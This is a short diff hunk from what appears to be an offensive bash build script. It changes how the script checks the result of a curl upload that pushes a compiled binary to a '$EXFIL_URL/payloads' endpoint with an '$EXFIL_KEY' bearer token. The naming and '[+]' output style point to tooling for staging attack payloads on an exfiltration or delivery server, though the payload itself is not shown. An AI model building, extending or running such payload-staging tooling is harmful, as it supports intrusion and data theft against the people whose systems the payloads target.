@@ -390,8 +390,8 @@ if [[ "$UPLOAD" == "1" ]]; then
         -X POST "$EXFIL_URL/payloads" \
         -H "Authorization: Bearer $EXFIL_KEY" \
         -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=$BINARY_NAME")
-    if [[ "$HTTP_STATUS" == "200" ]]; then
-        echo "[+] Uploaded: $EXFIL_URL/payloads"
+    if [[ "$HTTP_STATUS" =~ ^[23] ]]; then
+        echo "[+] Uploaded: $EXFIL_URL/payloads/$BINARY_NAME"
     else
         echo "[!] Upload failed (HTTP $HTTP_STATUS)"
         cat /tmp/bb_upload_resp.txt 2>/dev/null && echo ""
